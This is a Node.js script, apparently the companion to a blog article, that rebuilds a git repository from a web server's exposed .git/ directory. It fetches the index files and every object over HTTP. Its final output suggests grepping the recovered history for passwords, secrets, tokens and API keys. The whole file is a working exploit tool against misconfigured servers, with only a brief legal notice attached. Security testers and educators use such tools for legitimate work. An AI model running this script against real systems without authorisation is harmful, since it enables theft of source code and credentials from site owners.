#!/usr/bin/env node
// git-dump.mjs — Reconstruct a git repository from an exposed .git/ directory
// served over plain HTTP. Node.js port of git-dump.py.
//
// Companion script to:
//   https://techearl.com/exposed-git-directory-attack
//
// Usage:
//   node git-dump.mjs <target-url> <output-dir>
//
// Example:
//   node git-dump.mjs http://localhost:8888/wp-content/uploads ./dumped
//
// Same strategy as the Python version:
//   1. Fetch the well-known .git/ index files (HEAD, refs/*, packed-refs, ...)
//   2. Extract SHA-1 references from each (40-char hex from text/commits,
//      20-byte binary from tree entries).
//   3. Fetch every object at .git/objects/aa/bbbb..., walk newly-discovered
//      SHAs, repeat until the queue is empty.
//   4. Inspect with a real `git` binary afterwards.
//
// Requires Node 18+ (uses the built-in global fetch). No npm dependencies.
//
// Legal: only run this against systems you own or have written permission
// to test.

import { mkdir, writeFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import { inflateSync } from "node:zlib";

const UA =
  "git-dumper-edu/1.0 (+https://techearl.com/exposed-git-directory-attack)";
const SHA_RE = /\b[0-9a-f]{40}\b/g;
const TIMEOUT_MS = 15_000;

const KNOWN_FILES = [
  "HEAD",
  "config",
  "description",
  "info/refs",
  "info/exclude",
  "objects/info/packs",
  "packed-refs",
  "logs/HEAD",
  "FETCH_HEAD",
  "ORIG_HEAD",
  "refs/heads/main",
  "refs/heads/master",
  "refs/heads/develop",
  "refs/remotes/origin/HEAD",
  "refs/remotes/origin/main",
  "refs/remotes/origin/master",
];

async function fetchBytes(url) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), TIMEOUT_MS);
  try {
    const res = await fetch(url, {
      headers: { "User-Agent": UA },
      signal: ctrl.signal,
    });
    if (!res.ok) return null;
    return Buffer.from(await res.arrayBuffer());
  } catch {
    return null;
  } finally {
    clearTimeout(t);
  }
}

async function save(outDir, rel, data) {
  const path = join(outDir, ".git", rel);
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, data);
}

function shasFrom(buf) {
  const out = new Set();

  // Pass 1: 40-char hex references (refs, commits, packed-refs, logs)
  const text = buf.toString("binary");
  for (const m of text.matchAll(SHA_RE)) out.add(m[0]);

  // Pass 2: tree-entry parser. Tree objects encode SHA-1 as raw 20 bytes
  // after each `<mode> <filename>\0` header. Format:
  //   "tree <length>\0(<mode> <name>\0<20-byte-sha>)+"
  if (buf.slice(0, 5).toString() === "tree ") {
    let i = buf.indexOf(0) + 1;
    while (i < buf.length) {
      const nul = buf.indexOf(0, i);
      if (nul === -1 || nul + 20 > buf.length) break;
      out.add(buf.slice(nul + 1, nul + 21).toString("hex"));
      i = nul + 21;
    }
  }
  return out;
}

function inflate(buf) {
  try {
    return inflateSync(buf);
  } catch {
    return buf;
  }
}

function objectUrl(base, sha) {
  return `${base}/.git/objects/${sha.slice(0, 2)}/${sha.slice(2)}`;
}

async function main() {
  const [, , target, outDirArg] = process.argv;
  if (!target || !outDirArg) {
    console.error(`usage: node ${process.argv[1]} <target-url> <output-dir>`);
    process.exit(2);
  }
  const base = target.replace(/\/+$/, "");
  const outDir = outDirArg;
  await mkdir(outDir, { recursive: true });

  const queue = new Set();
  const seen = new Set();

  // Phase 1: seed from known index files.
  for (const rel of KNOWN_FILES) {
    const data = await fetchBytes(`${base}/.git/${rel}`);
    if (!data) continue;
    await save(outDir, rel, data);
    for (const sha of shasFrom(data)) queue.add(sha);
    console.log(`  fetched .git/${rel} (${data.length} bytes)`);
  }

  // Phase 2: walk objects.
  while (queue.size > 0) {
    const sha = queue.values().next().value;
    queue.delete(sha);
    if (seen.has(sha)) continue;
    seen.add(sha);

    const data = await fetchBytes(objectUrl(base, sha));
    if (!data) continue;
    await save(outDir, `objects/${sha.slice(0, 2)}/${sha.slice(2)}`, data);
    for (const next of shasFrom(inflate(data))) {
      if (!seen.has(next)) queue.add(next);
    }
    console.log(
      `  fetched object ${sha}  (queue: ${queue.size}, seen: ${seen.size})`,
    );
  }

  console.log(`\nDone. Fetched ${seen.size} objects.`);
  console.log(`Reconstructed repo at: ${outDir}`);
  console.log(`\nNext steps:`);
  console.log(`  cd ${outDir}`);
  console.log(`  git fsck --full`);
  console.log(`  git log --all --oneline`);
  console.log(`  git log --all -p`);
  console.log(`  git log --all -p | grep -iE 'password|secret|token|api_key'`);
}

main();
